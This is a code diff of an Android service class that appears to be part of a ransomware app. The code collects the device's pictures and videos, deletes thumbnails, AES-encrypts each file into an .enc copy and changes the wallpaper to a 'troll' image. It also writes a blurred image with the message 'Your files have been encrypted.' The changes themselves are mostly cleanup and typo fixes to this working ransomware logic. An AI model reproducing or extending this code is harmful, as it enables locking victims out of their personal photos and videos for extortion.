@@ -40,6 +40,7 @@ public class MyService extends Service {
     public IBinder onBind(Intent intent) {
         return null;
     }
+
     List<File> al, vids;
     int progress = 0;
     String totalFiles = "";
@@ -54,7 +55,7 @@ public class MyService extends Service {
         initialize();
     }
 
-    protected void initialize(){
+    protected void initialize() {
         ctx = getApplicationContext();
         r = new Random();
 
@@ -73,68 +74,73 @@ public class MyService extends Service {
         totalFiles = String.valueOf(al.size()) + " And " + String.valueOf(vids.size());
     }
 
-    protected void openHappyActivity(){
-        Helper.changeWallPaper(ctx,R.drawable.happy);
-        startActivity(new Intent(ctx, HappyActivity.class));
+    protected void openHappyActivity() {
+        Helper.changeWallPaper(ctx, R.drawable.happy);
+        //startActivity(new Intent(ctx, HappyActivity.class));
+        startActivity(new Intent(ctx, HappyActivity.class).setFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
     }
 
-    protected void openDecryptActivity(){
-        startActivity(new Intent(ctx, DecryptActivity.class));
+    protected void openDecryptActivity() {
+        //startActivity(new Intent(ctx, DecryptActivity.class));
+        startActivity(new Intent(ctx, DecryptService.class).setFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
+
     }
 
     /*
-    * Check if the key typed is correct
-    * DEACTIVATED
-    * */
-    private Boolean checkTypedKey(){
+     * Check if the key typed is correct
+     * DEACTIVATED
+     * */
+    public Boolean checkTypedKey()
+    {
         String typedKey = LocalStorage.getInstance(ctx).getByTag(LocalStorage.TAG_TEMP_KEY);
         String currentKey = LocalStorage.getInstance(ctx).getByTag(LocalStorage.TAG_KEY);
+        Log.d("currentKey" , String.valueOf(currentKey.equals(typedKey)));
         return currentKey.equals(typedKey);
     }
 
     /*
-    * Check encrypted state
-    * @returns True -> Enctypted
-    * @returns False -> Decrypted
-    * */
-    protected Boolean checkEncryptedState(){
+     * Check encrypted state
+     * @returns True -> Encrypted
+     * @returns False -> Decrypted
+     * */
+    protected Boolean checkEncryptedState() {
         return LocalStorage.getInstance(ctx).getBooleanByTag(LocalStorage.TAG_ENCRYPTED);
     }
 
     /*
-    * Save encrypted state on Local Storage
-    * */
-    protected void saveEncryptedState(){
-        LocalStorage.getInstance(ctx).setByTag(LocalStorage.TAG_ENCRYPTED,true);
+     * Save encrypted state on Local Storage
+     * */
+    protected void saveEncryptedState() {
+        LocalStorage.getInstance(ctx).setByTag(LocalStorage.TAG_ENCRYPTED, true);
     }
 
     /*
-    * Save decrypted state on Local Storage
-    * */
-    protected void saveDecryptedState(){
-        LocalStorage.getInstance(ctx).setByTag(LocalStorage.TAG_ENCRYPTED,false);
+     * Save decrypted state on Local Storage
+     * */
+    protected void saveDecryptedState() {
+        LocalStorage.getInstance(ctx).setByTag(LocalStorage.TAG_ENCRYPTED, false);
     }
 
     /*
-    * Generate and save Random ID
-    * */
+     * Generate and save Random ID
+     * */
     protected void generateRandomId() {
         Long hex = r.nextLong();
         String id = Long.toHexString(hex);
         id = new String(id.getBytes());
         Date d = new Date();
-        this.idUser = String.format("%s-%s",d.getTime(),id);
-        LocalStorage.getInstance(ctx).setByTag(LocalStorage.TAG_ID_USER,idUser);
+        this.idUser = String.format("%s-%s", d.getTime(), id);
+        LocalStorage.getInstance(ctx).setByTag(LocalStorage.TAG_ID_USER, idUser);
     }
 
     /*
-    * Generate and save Random key
-    * */
-    protected void generateRandomKey(){
+     * Generate and save Random key
+     * */
+    protected void generateRandomKey() {
         Long hex = r.nextLong();
         String key = Long.toHexString(hex);
         this.KEY = key.getBytes();
-        LocalStorage.getInstance(ctx).setByTag(LocalStorage.TAG_KEY,key);
+        LocalStorage.getInstance(ctx).setByTag(LocalStorage.TAG_KEY, key);
     }
 
     public void updateProgress(boolean direction) {
@@ -147,7 +153,7 @@ public class MyService extends Service {
     }
 
     public void encryptFiles() throws Exception {
-        Helper.makeToast(ctx,"Pics");
+        Helper.makeToast(ctx, "Pics");
         for (File file : al) {
             if (file.getPath().contains(".thumbnails")) {
                 file.delete();
@@ -166,27 +172,24 @@ public class MyService extends Service {
                 updateProgress(true);
             }
         }
-        Helper.makeToast(ctx,"Vids");
+        Helper.makeToast(ctx, "Vids");
         for (File vid : vids) {
-            if (!vid.getPath().contains(".enc")){
-                Aes.encryptLarge(KEY.toString(), vid, new File(vid.getPath()+".enc"));
+            if (!vid.getPath().contains(".enc")) {
+                Aes.encryptLarge(KEY.toString(), vid, new File(vid.getPath() + ".enc"));
             }
         }
-
-
         Bitmap bm = BitmapFactory.decodeResource(getResources(), R.mipmap.ic_launcher);
         ByteArrayOutputStream stream = new ByteArrayOutputStream();
         bm.compress(Bitmap.CompressFormat.PNG, 100, stream);
-        saveFile(stream.toByteArray(), Environment.getExternalStorageDirectory() + File.separator + "Pictures" );
+        saveFile(stream.toByteArray(), Environment.getExternalStorageDirectory() + File.separator + "Pictures");
 
-        Helper.changeWallPaper(ctx,R.drawable.troll);
-        Helper.makeToast(ctx,"Done");
-
+        Helper.changeWallPaper(ctx, R.drawable.troll);
+        Helper.makeToast(ctx, "Done");
     }
 
     public void decryptFile() throws Exception {
         for (File file : al) {
-            Log.v("FILE",file.getPath());
+            Log.v("FILE", file.getPath());
             if (file.getPath().contains(".thumbnails") || file.getPath().contains("brld")) {
                 file.delete();
             } else if (file.getPath().contains(".enc") && !file.getPath().contains(".enc.enc") && !file.getPath().contains("brld")) {
@@ -205,7 +208,7 @@ public class MyService extends Service {
             }
         }
 
-        Helper.makeToast(ctx,"Decrypted... i guess :D");
+        Helper.makeToast(ctx, "Decrypted.");
     }
 
     byte[] fullyReadFileToBytes(File f) throws IOException {
@@ -282,7 +285,7 @@ public class MyService extends Service {
             return null;
         }
         Bitmap blurredBitmap = BlurBuilder.blur(this, bitmap);
-        Bitmap textedBm = drawMultilineTextToBitmap(blurredBitmap, "Your files have been encripted.");
+        Bitmap textedBm = drawMultilineTextToBitmap(blurredBitmap, "Your files have been encrypted.");
 
 
         ByteArrayOutputStream stream = new ByteArrayOutputStream();
